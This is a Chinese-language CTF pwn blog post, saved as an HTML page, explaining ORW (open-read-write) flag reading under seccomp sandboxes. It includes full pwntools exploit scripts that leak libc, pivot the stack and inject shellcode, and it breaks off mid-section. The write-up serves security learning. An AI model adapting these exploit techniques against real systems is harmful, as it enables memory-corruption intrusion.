@@ -1,0 +1,956 @@
+
+  <!DOCTYPE html>
+  <html lang="zh-CN"  data-theme="dark" >
+  <head>
+  <meta charset="utf-8">
+  
+  <script src="https://www.googletagmanager.com/gtag/js?id=true"></script>
+  <script data-pjax>
+    window.dataLayer = window.dataLayer || [];
+
+    function gtag() {
+      dataLayer.push(arguments);
+    }
+
+    gtag('js', new Date());
+    gtag('config', 'true');
+  </script>
+
+
+  
+  <script>
+    (function(c,l,a,r,i,t,y){
+        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+    })(window, document, "clarity", "script", "true");
+  </script>
+
+
+  
+  <script async src="https://hm.baidu.com/hm.js?true"></script>
+  <script data-pjax>
+    var _hmt = _hmt || [];
+    _hmt.push(["_trackPageview", location.pathname]);
+  </script>
+
+
+  
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.clipboard_tips = {"success":"我是复制糕手!(*^▽^*)!","fail":"一拳一个不让复制![○･｀Д´･ ○]","copyright":{"enable":true,"count":50,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};window.REIMU_CONFIG.outdate = {"enable":true,"daysAgo":180,"message":"本文最后更新于 {time}，请注意文中内容可能已经发生变化。"};window.REIMU_CONFIG.anchor_icon = 'f2dc';</script>
+  
+  
+  <title>
+    ORW |
+    
+    Dusk的怪东西
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@fortawesome/fontawesome-free@6.5.1/css/regular.min.css">
+<link rel="stylesheet" href="https://npm.webcache.cn/@fortawesome/fontawesome-free@6.5.1/css/solid.min.css">
+
+    <link rel="preload" href="https://npm.webcache.cn/@fortawesome/fontawesome-free@6.5.1/css/brands.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+<link rel="preload" href="https://npm.webcache.cn/@fortawesome/fontawesome-free@6.5.1/css/v5-font-face.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+<link rel="preload" href="https://npm.webcache.cn/@fortawesome/fontawesome-free@6.5.1/css/v4-font-face.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="总结大部分的orw方式">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ORW">
+<meta property="og:url" content="https://fallingdusky.github.io/2024/03/29/orw/index.html">
+<meta property="og:site_name" content="Dusk的怪东西">
+<meta property="og:description" content="总结大部分的orw方式">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2024/05/27/6YzseGqjvZT4lSw.png">
+<meta property="og:image" content="https://s2.loli.net/2024/05/27/2wD5ThUeRJazsv6.png">
+<meta property="og:image" content="https://s2.loli.net/2024/05/27/YQr14TvsuySxRHW.png">
+<meta property="og:image" content="https://s2.loli.net/2024/05/27/92tvAMLucdkeKQI.png">
+<meta property="og:image" content="https://s2.loli.net/2024/05/27/ILEAlRiTxdH96JZ.png">
+<meta property="og:image" content="https://s2.loli.net/2024/05/27/abewZpHnrISCoWV.png">
+<meta property="og:image" content="https://s2.loli.net/2024/05/27/DoSI9RACY2mWegf.png">
+<meta property="og:image" content="https://s2.loli.net/2024/05/27/OfY3oQnr2tMElT9.png">
+<meta property="og:image" content="https://s2.loli.net/2024/05/27/7QSnkXZL3INbMw8.png">
+<meta property="og:image" content="https://s2.loli.net/2024/05/27/yBhVxMoejmn37XC.png">
+<meta property="og:image" content="https://s2.loli.net/2024/05/27/jhOSixQKw95X3NU.png">
+<meta property="og:image" content="https://s2.loli.net/2024/05/27/8aNxWPme7XA912V.png">
+<meta property="og:image" content="https://s2.loli.net/2024/05/27/9pt21A5QFXdjirH.png">
+<meta property="og:image" content="https://s2.loli.net/2024/05/27/qIlxa4MJiVktUse.png">
+<meta property="og:image" content="https://s2.loli.net/2024/05/27/AfStr4NobpcX5dU.png">
+<meta property="og:image" content="https://s2.loli.net/2024/05/27/zlFceIGUajMPS1q.png">
+<meta property="og:image" content="https://s2.loli.net/2024/05/27/u6owNrSyxiMjzt4.png">
+<meta property="og:image" content="https://s2.loli.net/2024/05/30/aD7JNuxIqbrSivg.png">
+<meta property="og:image" content="https://s2.loli.net/2024/05/27/OHALjlQYCwIsozn.png">
+<meta property="og:image" content="https://s2.loli.net/2024/05/27/ghUn57oifscbA8S.png">
+<meta property="og:image" content="https://s2.loli.net/2024/05/27/ZzlguI691ytkDcb.png">
+<meta property="og:image" content="https://s2.loli.net/2024/05/27/lausEqIC398HY1P.png">
+<meta property="og:image" content="https://s2.loli.net/2024/05/27/k6hYP5NfjBrsDEF.png">
+<meta property="og:image" content="https://s2.loli.net/2024/05/27/mRfsPuEq5zAJn6X.png">
+<meta property="og:image" content="https://s2.loli.net/2024/05/27/ZN7xaDe53T46EVR.png">
+<meta property="og:image" content="https://s2.loli.net/2024/05/27/zGEavwpeJTIHh6g.png">
+<meta property="og:image" content="https://s2.loli.net/2024/05/27/TaicSkOPIUXNMuh.png">
+<meta property="og:image" content="https://s2.loli.net/2024/05/27/uz9iblEtRgycsJ1.png">
+<meta property="og:image" content="https://s2.loli.net/2024/05/27/PcfQOGYoC6kb5ML.png">
+<meta property="og:image" content="https://s2.loli.net/2024/05/27/eMJ5w72UsWoH9gK.png">
+<meta property="og:image" content="https://s2.loli.net/2024/05/27/FMzfAUdKEy2QaWx.png">
+<meta property="og:image" content="https://s2.loli.net/2024/05/27/HeYLrEJqxFyW5h2.png">
+<meta property="og:image" content="https://s2.loli.net/2024/05/27/NTG8hjfc9PQrUvJ.png">
+<meta property="og:image" content="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240427104507741-953595500.png">
+<meta property="og:image" content="https://s2.loli.net/2024/05/27/LYXeNIUjokb6ASE.png">
+<meta property="og:image" content="https://s2.loli.net/2024/05/27/oIy4hJjcM9K1gVB.png">
+<meta property="og:image" content="https://s2.loli.net/2024/05/27/G4tYSXkNhFi3VZP.png">
+<meta property="og:image" content="https://s2.loli.net/2024/05/27/97bChAdw2iLZBPU.png">
+<meta property="og:image" content="https://s2.loli.net/2024/05/27/3hsdqyToaL6NGQp.png">
+<meta property="og:image" content="https://s2.loli.net/2024/05/28/KOcTpUDAoxCn4dz.png">
+<meta property="og:image" content="https://s2.loli.net/2024/05/28/TJw9OLxvPfSyAeN.png">
+<meta property="og:image" content="https://s2.loli.net/2024/05/28/EIvYm6sCyDGqQnb.png">
+<meta property="article:published_time" content="2024-03-29T12:48:00.000Z">
+<meta property="article:modified_time" content="2024-11-29T13:05:02.706Z">
+<meta property="article:author" content="Dusk">
+<meta property="article:tag" content="Pwn">
+<meta property="article:tag" content="Heap">
+<meta property="article:tag" content="Stack">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2024/05/27/6YzseGqjvZT4lSw.png">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="Dusk的怪东西" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css">
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      <div class="loading-word">格林...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon ">
+            &#xf2dc;
+          </div>
+          <a class="main-nav-link" href="/">首页</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon ">
+            &#xf2dc;
+          </div>
+          <a class="main-nav-link" href="/archives">归档</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon ">
+            &#xf2dc;
+          </div>
+          <a class="main-nav-link" href="/about">关于</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon ">
+            &#xf2dc;
+          </div>
+          <a class="main-nav-link" href="/friend">友链</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" target="_blank"></a>
+    
+    
+    
+      <a id="nav-search-btn" class="nav-icon popup-trigger" title="搜索"></a>
+    
+  </nav>
+</div>
+<header id="header">
+  
+    
+      <img fetchpriority="high" src="/images/banner.webp" alt="ORW">
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">ORW</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content">
+          
+          <section id="main"><article id="post-orw" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <a href="/2024/03/29/orw/" class="article-date-link" data-aos="zoom-in">
+    <time datetime="2024-03-29T12:48:00.000Z" itemprop="datePublished">2024-03-29</time>
+    <time style="display: none;" id="post-update-time">2024-11-29</time>
+  </a>
+</div>
+
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" data-aos="zoom-in">网络安全</a>
+  </div>
+
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <blockquote id="outdate-blockquote" style="display: none;"><p></p></blockquote>
+      
+      
+        <h1 id="orw"><a class="markdownIt-Anchor" href="#orw"></a> ORW</h1>
+<h2 id="引入"><a class="markdownIt-Anchor" href="#引入"></a> 引入</h2>
+<p>在现今的CTF赛事中，越来越多的题目启动了沙箱，往往是禁用了<code>execve</code>函数，使我们没办法直接通过<code>system(/bin/sh\x00)</code>来getshell，这个时候就到了ORW大显身手的时刻。<br />
+ORW分别是<strong>open,read,write</strong>的首字母缩写，也正是要利用这三个函数来<strong>读出flag文件</strong></p>
+<h2 id="原理"><a class="markdownIt-Anchor" href="#原理"></a> 原理</h2>
+<p>在禁用execve的情况下，我们需要经过以下操作来得到flag值</p>
+<pre><code>open开flag文件
+read出flag的内容
+write显示flag的值
+</code></pre>
+<h2 id="攻击方式"><a class="markdownIt-Anchor" href="#攻击方式"></a> 攻击方式</h2>
+<p>在知晓大概的流程之后，就得设置寄存器的参数了，我们得知道各个函数对应的参数分别代表什么意思<br />
+<code>open(file,oflag)</code>,<code>read(fd,buf,n_bytes)</code>和<code>write(fd,buf,n_bytes)</code></p>
+<h3 id="open"><a class="markdownIt-Anchor" href="#open"></a> open</h3>
+<p>file就是我们要读取的<strong>文件名</strong>，CTF中一般为flag，或者flag.txt。<br />
+而oflag则是我们<strong>以何种方式打开文件</strong>，如只读，只写，可读可写。一般来说我们都设置<code>oflag=0</code>，以默认方式打开文件，一般来说都是<strong>只读</strong>，我们并不需要对flag进行其它操作，所以只读的权限就够了</p>
+<h3 id="read和write"><a class="markdownIt-Anchor" href="#read和write"></a> read和write</h3>
+<p>这两个是大同小异的。<strong>fd是文件描述符</strong>，通过设置它来决定函数的操作。<strong>在大多数时候，我们常常设置read的fd为0，代表标准输入</strong>，但在ORW中，我们需要<strong>设置read的fd为3，表示从文件中读取</strong>，buf就是我们读取出的flag值存放的地址，n_bytes就是能输入多少字节的数据。write的fd还是如常，依旧为1.</p>
+<h3 id="效果"><a class="markdownIt-Anchor" href="#效果"></a> 效果</h3>
+<p>源码如图</p>
+<p><img src="https://s2.loli.net/2024/05/27/6YzseGqjvZT4lSw.png" alt=" 2024-05-27 173409.png" /></p>
+<p>Linux下的执行效果</p>
+<p><img src="https://s2.loli.net/2024/05/27/2wD5ThUeRJazsv6.png" alt=" 2024-05-27 173541.png" /><br />
+<img src="https://s2.loli.net/2024/05/27/YQr14TvsuySxRHW.png" alt=" 2024-05-27 173558.png" /><br />
+<img src="https://s2.loli.net/2024/05/27/92tvAMLucdkeKQI.png" alt=" 2024-05-27 173620.png" /></p>
+<p><img src="https://s2.loli.net/2024/05/27/ILEAlRiTxdH96JZ.png" alt=" 2024-05-27 173639.png" /></p>
+<p>当然，我们构建源码是非常简单的，但是题目里就不一定了，根据题目的不同ORW里也有一些变种</p>
+<h2 id="栈上的orw"><a class="markdownIt-Anchor" href="#栈上的orw"></a> 栈上的ORW</h2>
+<h3 id="rop链的orw"><a class="markdownIt-Anchor" href="#rop链的orw"></a> ROP链的ORW</h3>
+<p>这是我们最常见的ORW了，通过ROPgadget在ELF文件、libc.so.6中寻找我们的gadget。在这种orw中，我们需要用的寄存器有<code>rax,rdi,rdx,rsi</code>。rax的作用不必多说，系统调用号。而<strong>rdi在这open中存储file的地址，在read和write中储存fd；rdx储存的是输入\输出的字节数大小；rsi在open中储存的是oflag，在read和write中储存的是buf</strong></p>
+<pre><code>open(rdi--&gt;file_addr,rsi--&gt;oflag)
+read/write(rdi--&gt;fd,rsi--&gt;buf,rdx--&gt;s_nbytes)
+</code></pre>
+<p>嫌这样记太麻烦的话，就只需要记住它的参数传递符合x64的<strong>函数调用约定</strong></p>
+<h4 id="例题-hgame-2023-week1orw"><a class="markdownIt-Anchor" href="#例题-hgame-2023-week1orw"></a> 例题 [HGAME 2023 week1]orw</h4>
+<p>根据题目一眼看出就是ORW，我们先看看函数</p>
+<p><img src="https://s2.loli.net/2024/05/27/abewZpHnrISCoWV.png" alt=" 2024-05-27 180227.png" /><br />
+<img src="https://s2.loli.net/2024/05/27/DoSI9RACY2mWegf.png" alt=" 2024-05-27 180237.png" /></p>
+<p><img src="https://s2.loli.net/2024/05/27/OfY3oQnr2tMElT9.png" alt=" 2024-05-27 184023.png" /></p>
+<p><img src="https://s2.loli.net/2024/05/27/7QSnkXZL3INbMw8.png" alt=" 2024-05-27 180423.png" /></p>
+<p>检验过后确实是ORW，禁用了execve，read函数里只够0x28个字节，明显是不够的，<strong>需要迁移</strong>。</p>
+<h5 id="流程"><a class="markdownIt-Anchor" href="#流程"></a> 流程</h5>
+<p>第一次我们泄露libc，用libc_base来求取open,read,write，为第二次的read的buf迁移做准备。</p>
+<p>这道题的核心就是第二次的buf迁移，因为要覆盖到ret地址需要0x108个字节，我们能利用的<strong>只有0x28个字节</strong>，因此我们需要迁移到bss区。</p>
+<p>这里的关键汇编指令是 <code>lea rax, [rbp+buf]</code>，意为取[rbp+buf]的地址存储到rax中，而rax在下面又会赋值给rsi，相当于完成了迁移，就有足够的字节构造ORW了。<br />
+<img src="https://s2.loli.net/2024/05/27/yBhVxMoejmn37XC.png" alt=" 2024-05-27 185825.png" /></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload_migration = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span> + p64(elf.bss() + <span class="number">0x300</span> + <span class="number">0x100</span>) + p64(lea_rax) <span class="comment">#0x100个a覆盖到rbp，将rbp覆盖为bss + 0x400处，至于为什么要0x400分开成0x300+0x100，是为了更好理解，因为buf相对rbp的距离是0x100字节，加0x100是为了抵消这部分偏移，便于后面计算。lea_rax就是ret到它所处的地址</span></span><br></pre></td></tr></table></figure>
+<p>这是执行过该payload后的效果</p>
+<p><img src="https://s2.loli.net/2024/05/27/jhOSixQKw95X3NU.png" alt=" 2024-05-27 190301.png" /></p>
+<p>第三步就是纯粹的ORW链构造了，我直接放在完整payload里并解释好了</p>
+<h5 id="payload"><a class="markdownIt-Anchor" href="#payload"></a> Payload</h5>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">p = process(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line"><span class="comment"># p = remote(&#x27;node5.anna.nssctf.cn&#x27;,28996)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line">offset = <span class="number">0x100</span> + <span class="number">0x08</span></span><br><span class="line">pop_rdi = <span class="number">0x401393</span> <span class="comment">#file address\fd</span></span><br><span class="line">pop_ret = <span class="number">0x40101a</span></span><br><span class="line">bss = <span class="number">0x404300</span></span><br><span class="line">lea_rax = <span class="number">0x4012CF</span> <span class="comment">#迁移read_buf</span></span><br><span class="line">puts_plt = elf.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x4012F0</span></span><br><span class="line">leave = <span class="number">0x4012EE</span> <span class="comment">#栈迁移</span></span><br><span class="line"></span><br><span class="line">payload_leak = <span class="string">b&#x27;a&#x27;</span> * offset + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr) <span class="comment">#泄露puts的地址，返回main函数</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Maybe you can learn something about seccomp, before you try to solve this task.&#x27;</span>)</span><br><span class="line">p.send(payload_leak)</span><br><span class="line">puts_real_addr = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&#x27;puts_real_addr==&gt;&#x27;</span> + <span class="built_in">hex</span>(puts_real_addr))</span><br><span class="line">libc_base = puts_real_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;libc_base==&gt;&#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">open_addr = libc_base + libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;open_addr==&gt;&#x27;</span> + <span class="built_in">hex</span>(open_addr))</span><br><span class="line">read_addr = libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;read_addr==&gt;&#x27;</span> + <span class="built_in">hex</span>(read_addr))</span><br><span class="line">write_addr = libc_base + libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;write_addr==&gt;&#x27;</span> + <span class="built_in">hex</span>(write_addr))</span><br><span class="line">pop_rdx = libc_base + <span class="number">0x142c92</span> <span class="comment">#设置可输入\输出字节大小</span></span><br><span class="line">pop_rsi = libc_base + <span class="number">0x2601f</span> <span class="comment">#oflag,buf</span></span><br><span class="line"></span><br><span class="line">payload_migration = <span class="string">b&#x27;a&#x27;</span> * (offset - <span class="number">0x08</span>) + p64(bss + <span class="number">0x300</span> + <span class="number">0x100</span>) + p64(lea_rax)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Maybe you can learn something about seccomp, before you try to solve this task.&#x27;</span>)</span><br><span class="line">p.send(payload_migration)</span><br><span class="line">pause() <span class="comment">#暂停一下是为了防止一次性输送太多数据导致传输错误，无法成功执行ORW</span></span><br><span class="line">payload = <span class="string">b&#x27;/flag\00\x00\x00&#x27;</span> + p64(pop_rdi) + p64(bss + <span class="number">0x300</span>) + p64(pop_rsi) + p64(<span class="number">0</span>) + p64(open_addr) <span class="comment">#rdi储存bss+0x300地址处的值，也就是我们的flag</span></span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">3</span>) + p64(pop_rsi) + p64(bss + <span class="number">0x300</span>) + p64(pop_rdx) + p64(<span class="number">0x100</span>) + p64(read_addr) <span class="comment">#从bss + 0x300处读取文件信息</span></span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">1</span>) +p64(pop_rsi) + p64(bss + <span class="number">0x300</span>) + p64(pop_rdx) + p64(<span class="number">0x100</span>) + p64(write_addr) <span class="comment">#将bss + 0x300处的数据输出出来</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(bss + <span class="number">0x300</span>) + p64(leave) <span class="comment">#因为我们的ROP链在bss区上，所以我们要用栈迁移迁过去，至于为什么bss + 0x300没有减0x08，是因为开头输入了flag并对齐了8字节，无需再关注两次leave带来的rsp抬高0x08个字节</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="shellcraft模块的orw"><a class="markdownIt-Anchor" href="#shellcraft模块的orw"></a> shellcraft模块的ORW</h3>
+<p>众所周知，pwntools库里给我们提供了许多模块供我们进行脚本攻击，其中shellcraft也是我们常用的模块，常常被我们用于<strong>ret2shellcode攻击</strong>，但它<strong>也可以被用来构造ORW链</strong>，常见形式如下</p>
+<pre><code>shellcraft.open('/flag')
+shellcraft.read(3,buf,n_bytes)
+shellcraft.write(1,buf,n_bytes)
+</code></pre>
+<p>相比于ROP链的攻击，它更为简单，因为我们不需要再寻找寄存器了。不过它的<strong>条件也很苛刻</strong>，必须是<strong>可读可写可执行</strong>的区域，所以它的<strong>泛用性并不是那么广</strong></p>
+<h4 id="例题-第二届贺春杯-shellcode"><a class="markdownIt-Anchor" href="#例题-第二届贺春杯-shellcode"></a> 例题 第二届贺春杯 shellcode</h4>
+<p>一如既往看看程序运行逻辑</p>
+<p><img src="https://s2.loli.net/2024/05/27/8aNxWPme7XA912V.png" alt=" 2024-05-27 192850.png" /><br />
+<img src="https://s2.loli.net/2024/05/27/9pt21A5QFXdjirH.png" alt=" 2024-05-27 192859.png" /></p>
+<p><img src="https://s2.loli.net/2024/05/27/qIlxa4MJiVktUse.png" alt=" 2024-05-27 192938.png" /></p>
+<p>嗯，半shellcode半ORW，题目映射了一段可读可写可执行的地址，那么就很简单了，先往addr里塞用shellcraft编写的ORW链，然后从buf跳到addr即可</p>
+<h5 id="payload-2"><a class="markdownIt-Anchor" href="#payload-2"></a> Payload</h5>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">p = process(<span class="string">&#x27;./shellcode&#x27;</span>)</span><br><span class="line">shellcode_addr = <span class="number">0x196082000</span></span><br><span class="line">bss_addr = <span class="number">0x404080</span></span><br><span class="line">offset = <span class="number">0x10</span> + <span class="number">0x08</span></span><br><span class="line">shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag\x00&#x27;</span>)</span><br><span class="line">shellcode += shellcraft.read(<span class="number">3</span>, shellcode_addr + <span class="number">0x300</span>,<span class="number">0x200</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>,shellcode_addr + <span class="number">0x300</span>,<span class="number">0x200</span>)</span><br><span class="line">shellcode = asm(shellcode) <span class="comment">#别忘记用asm包裹，shellcraft编写的是机械码</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;magic!\n&#x27;</span>)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">pause()</span><br><span class="line">payload = offset * <span class="string">b&#x27;a&#x27;</span> + p64(shellcode_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive() </span><br></pre></td></tr></table></figure>
+<h3 id="禁用orw的部分函数写orw"><a class="markdownIt-Anchor" href="#禁用orw的部分函数写orw"></a> 禁用ORW的部分函数写ORW</h3>
+<h4 id="sendfile"><a class="markdownIt-Anchor" href="#sendfile"></a> sendfile</h4>
+<p>普通的ORW太简单，<strong>一般都会给你ban掉一部分跟ORW有关的函数</strong>，open被ban了可以用openat代替，write没了可以用puts代替,read可以用readv等代替。这时候就是<strong>考验攻击者对函数的熟练度了，有时候还需要汇编功底</strong></p>
+<h5 id="例题-xyctf-orw"><a class="markdownIt-Anchor" href="#例题-xyctf-orw"></a> 例题 XYCTF orw</h5>
+<p>看着是一道很简单的ORW题，但是它的水很深，一不留神就掉坑里了<br />
+<img src="https://s2.loli.net/2024/05/27/AfStr4NobpcX5dU.png" alt=" 2024-05-27 194702.png" /><br />
+<img src="https://s2.loli.net/2024/05/27/zlFceIGUajMPS1q.png" alt=" 2024-05-27 194710.png" /><br />
+<img src="https://s2.loli.net/2024/05/27/u6owNrSyxiMjzt4.png" alt=" 2024-05-27 194757.png" /></p>
+<p>把ORW函数几乎给你ban了个遍，open还好说，但这read和write都ban的不成样了</p>
+<h6 id="坑"><a class="markdownIt-Anchor" href="#坑"></a> 坑</h6>
+<p>想找两个函数来代替这俩，然后用ROP给执行了，但其实这也是这题的一个坑，因为…<br />
